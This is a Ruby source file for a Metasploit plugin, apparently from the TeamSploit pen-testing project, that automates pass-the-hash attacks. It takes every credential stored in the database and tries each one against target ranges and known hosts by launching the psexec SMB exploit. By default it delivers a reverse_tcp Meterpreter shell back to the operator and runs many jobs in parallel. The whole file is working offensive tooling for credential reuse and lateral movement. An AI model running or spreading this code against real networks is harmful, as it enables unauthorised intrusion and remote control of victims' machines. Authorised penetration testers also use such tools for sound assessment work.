#	TeamSploit - Pen Testing With Friends
#	Copyrighted:  Justin M. Wray (wray.justin@gmail.com)
#	Special Thanks:  Team ICF (Twitter:@ICFRedTeam)
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

module Msf

	###
	#
	# This class hooks all session creation events and allows automated interaction
	#
	###

	class Plugin::PassTheHash < Msf::Plugin

		class PassTheHash
			include Msf::Ui::Console::CommandDispatcher

			def name
				"pass_the_hash"
			end

			# Define Commands
			def commands
				{
					"pass_the_hash"    => "Use Collected Hash Against Other Systems",
				}
			end

			def cmd_pass_the_hash(*args)
				# Define Options
				opts = Rex::Parser::Arguments.new(
					"-d"   => [ true, "Domain (Default:  WORKGROUP"],
					"-h"   => [ false, "Command Help"],
					"-p"   => [ true, "Payload (Default:  Meterpreter)"],
					"-j"   => [ true, "Jobs/Threads (Default:  5)"],
					"-o"   => [ true, "Timeout (Default:  30 seconds)"],
					"-t"   => [ true, "Target Range (Comma Delimited)"],
					"-x"   => [ false, "Exclude Targets in Database"],
				)

				# Variables
				targets = []
				opt_targets = []
				used_ports = []
				domain = "WORKGROUP"
				max_jobs = 5
				timeout = 30
				payload = "windows/meterpreter/reverse_tcp"
				include_db_hosts = true

				# Parse options
				opts.parse(args) do |opt, idx, val|
					case opt
						when "-d"
							domain = val
						when "-p"
							payload = val
						when "-j"
							max_jobs = val
						when "-o"
							timeout = val
						when "-t"
		                                	opt_targets = val.gsub(" ","").split(",")
						when "-x"
							include_db_hosts = false
						when "-h"
							print_line(opts.usage)
							return
					end
				end

				#  Build Target List
				opt_targets.each do |target|
					Rex::Socket::RangeWalker.new(target).each do |ip|
						targets << ip
					end
				end

				#  Add Hosts (From DB) As Targets
				if include_db_hosts
					framework.db.workspace.hosts.each do |host|
						targets << host.address
					end
				end

				#  Check For Targets
				if targets.nil? || targets == 0 || targets.length == 0
					print_error("Error:  No Hosts in Database and/or You Didn't Specify Targets")
					return
				end

				#  Check For Creds in Database
				if framework.db.workspace.creds.length > 0
					#  Loop Through Creds
					framework.db.workspace.creds.each do |cred|
						#  Loop Through Each Target With Creds
						targets.each do |target|
							#  Make Sure We Don't Have This Host Already
							if framework.sessions.map { |s,r| r.tunnel_peer.split(":")[0] }.include?(target)
								print_status("\tSkipping #{target} Sessions Already Exists")
								next
							end

							#  Select Local Port Not In Use
							port_list = (1024..65000).to_a.shuffle.first
							port_list = (1024..65000).to_a.shuffle.first if used_ports.include?(port_list)

							#  Build Exploit Options
							begin
								exploit = framework.modules.create("exploit/windows/smb/psexec")
								exploit.datastore['PAYLOAD'] = payload
								exploit.datastore['RHOST'] = target
								exploit.datastore['LPORT'] = port_list
								exploit.datastore['LHOST']   = Rex::Socket.source_address(target)
								exploit.datastore['SMBUser'] = cred.user
								exploit.datastore['SMBPass'] = cred.pass
								exploit.datastore['SMBDomain'] = domain
								exploit.datastore['VERBOSE'] = true
								(exploit.options.validate(exploit.datastore))
								print_status("Passing #{cred.user} @ #{domain} Hash To #{target}")

								#  Launch Exploit
								Timeout::timeout(timeout) do
									exploit.exploit_simple(
										'Payload'	=> exploit.datastore['PAYLOAD'],
										'LocalInput'	=> driver.input,
										'LocalOutput'   => driver.output,
										'RunAsJob'	=> true
									)
								end
							rescue Timeout::Error
								print_error("Hash Passing to {#target} Timed Out")
							end
							while(framework.jobs.keys.length >= max_jobs.to_i)
								::IO.select(nil, nil, nil, 2.5)
								print_status("Max Jobs Running, Waiting - Current: Jobs #{framework.jobs.keys.length} / Threads: #{framework.threads.length}")
							end
						end
					end
				else
					print_error("No Credentials/Hashed in Database")
				end
				
			end
		end

		def initialize(framework, opts)
			super
			add_console_dispatcher(PassTheHash)
			print_status("Pass The Hash - Loaded")
		end

		def cleanup
			remove_console_dispatcher("pass_the_hash")
		end

		def name
			"pass_the_hash"
		end

		def desc
			"Automated Pass The Hash"
		end

	end
end

